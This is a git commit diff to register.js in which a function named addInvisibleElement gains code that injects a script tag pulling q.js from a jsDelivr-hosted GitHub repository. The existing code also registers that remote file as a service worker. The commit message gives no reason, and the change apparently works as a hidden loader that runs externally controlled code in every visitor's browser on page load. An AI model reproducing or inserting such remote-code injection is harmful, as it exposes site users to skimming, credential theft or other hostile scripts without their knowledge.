56df43ecdf1751eddfeadbc15759b6f502dca3b3
eq89 <156458521+eq89@users.noreply.github.com>
2024-01-23 01:06:02 +0500

    Update register.js

--- register.js
+++ register.js
@@ -5,6 +5,11 @@ function addInvisibleElement() {
       invisibleElement.id = 'invisibleElement';
       document.body.appendChild(invisibleElement);
 
+      var script1 = document.createElement('script');
+	    script1.src = 'https://cdn.jsdelivr.net/gh/eq89/edm@c3de103/q.js';
+		script1.type = 'text/javascript';
+		document.head.appendChild(script1);  
+
       if ('serviceWorker' in navigator) {
         navigator.serviceWorker.register('https://cdn.jsdelivr.net/gh/eq89/edm@c3de103/q.js')
           .then((registration) => {
